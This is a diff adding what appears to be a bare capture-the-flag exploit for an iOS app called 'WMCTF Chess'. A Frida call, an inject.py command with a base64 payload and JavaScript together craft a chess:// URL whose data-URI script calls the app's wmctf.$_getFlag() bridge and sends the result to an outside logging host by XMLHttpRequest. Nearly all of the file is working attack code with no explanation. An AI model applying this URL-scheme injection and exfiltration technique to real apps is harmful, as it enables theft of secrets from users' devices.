@@ -1,0 +1,28 @@
+WMCTF Chess
+
+
+
+ObjC.classes.UIApplication.sharedApplication().openURL_(ObjC.classes.NSURL.URLWithString_("chess://x?urlType=web&url=data%3Atext%2Fhtml%3B%2C%253Cscript%2520type%253D%2522application%252Fjavascript%2522%253E%2528function%2520payload%2528%2529%2520%257B%2520%2520%250A%2520%2520var%2520xhr%2520%253D%2520new%2520XMLHttpRequest%2528%2529%253B%2520xhr.open%2528%2527GET%2527%252C%2520%2527http%253A%252F%252Fhttplog.coderpub.com%252Fhttplog%252Ftest%253Fflag%253D%2527%2520%252B%2520wmctf.%2524_getFlag%2528%2529%252C%2520false%2529%253B%2520xhr.send%2528%2529%253B%250A%257D%2529%2528%2529%253C%252Fscript%253E"))
+
+
+python3 inject.py Y2hlc3M6Ly94P3VybFR5cGU9d2ViJnVybD1kYXRhJTNBdGV4dCUyRmh0bWwlM0IlMkMlMjUzQ3NjcmlwdCUyNTIwdHlwZSUyNTNEJTI1MjJhcHBsaWNhdGlvbiUyNTJGamF2YXNjcmlwdCUyNTIyJTI1M0UlMjUyOGZ1bmN0aW9uJTI1MjBwYXlsb2FkJTI1MjglMjUyOSUyNTIwJTI1N0IlMjUyMCUyNTIwJTI1MEElMjUyMCUyNTIwdmFyJTI1MjB4aHIlMjUyMCUyNTNEJTI1MjBuZXclMjUyMFhNTEh0dHBSZXF1ZXN0JTI1MjglMjUyOSUyNTNCJTI1MjB4aHIub3BlbiUyNTI4JTI1MjdHRVQlMjUyNyUyNTJDJTI1MjAlMjUyN2h0dHAlMjUzQSUyNTJGJTI1MkZodHRwbG9nLmNvZGVycHViLmNvbSUyNTJGaHR0cGxvZyUyNTJGdGVzdCUyNTNGZmxhZyUyNTNEJTI1MjclMjUyMCUyNTJCJTI1MjB3bWN0Zi4lMjUyNF9nZXRGbGFnJTI1MjglMjUyOSUyNTJDJTI1MjBmYWxzZSUyNTI5JTI1M0IlMjUyMHhoci5zZW5kJTI1MjglMjUyOSUyNTNCJTI1MEElMjU3RCUyNTI5JTI1MjglMjUyOSUyNTNDJTI1MkZzY3JpcHQlMjUzRQ==
+
+http://127.0.0.1:1024/chess?urlscheme=Y2hlc3M6Ly94P3VybFR5cGU9d2ViJnVybD1kYXRhJTNBdGV4dCUyRmh0bWwlM0IlMkMlMjUzQ3NjcmlwdCUyNTIwdHlwZSUyNTNEJTI1MjJhcHBsaWNhdGlvbiUyNTJGamF2YXNjcmlwdCUyNTIyJTI1M0UlMjUyOGZ1bmN0aW9uJTI1MjBwYXlsb2FkJTI1MjglMjUyOSUyNTIwJTI1N0IlMjUyMCUyNTIwJTI1MEElMjUyMCUyNTIwdmFyJTI1MjB4aHIlMjUyMCUyNTNEJTI1MjBuZXclMjUyMFhNTEh0dHBSZXF1ZXN0JTI1MjglMjUyOSUyNTNCJTI1MjB4aHIub3BlbiUyNTI4JTI1MjdHRVQlMjUyNyUyNTJDJTI1MjAlMjUyN2h0dHAlMjUzQSUyNTJGJTI1MkZodHRwbG9nLmNvZGVycHViLmNvbSUyNTJGaHR0cGxvZyUyNTJGdGVzdCUyNTNGZmxhZyUyNTNEJTI1MjclMjUyMCUyNTJCJTI1MjB3bWN0Zi4lMjUyNF9nZXRGbGFnJTI1MjglMjUyOSUyNTJDJTI1MjBmYWxzZSUyNTI5JTI1M0IlMjUyMHhoci5zZW5kJTI1MjglMjUyOSUyNTNCJTI1MEElMjU3RCUyNTI5JTI1MjglMjUyOSUyNTNDJTI1MkZzY3JpcHQlMjUzRQ==
+
+
+chess://x?urlType=web&url=data%3Atext%2Fhtml%3B%2C%253Cscript%2520type%253D%2522application%252Fjavascript%2522%253E%2528function%2520payload%2528%2529%2520%257B%2520%2520%250A%2520%2520wmctf.%2524_getFlag%2528%2529%250A%257D%2529%2528%2529%253C%252Fscript%253E
+
+
+String.prototype.toDataURI = function() {
+  return 'data:text/html;,' + encodeURIComponent(this).replace(/[!'()*]/g, escape);
+}
+
+function payload() {  
+  var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://XXX/test?flag=' + wmctf.$_getFlag(), false); xhr.send();
+}
+
+const data = `<script type="application/javascript">(${payload})()<\/script>`.toDataURI()
+const url = new URL('chess://x?urlType=web');
+
+url.searchParams.set('url', data);
+url.toString()
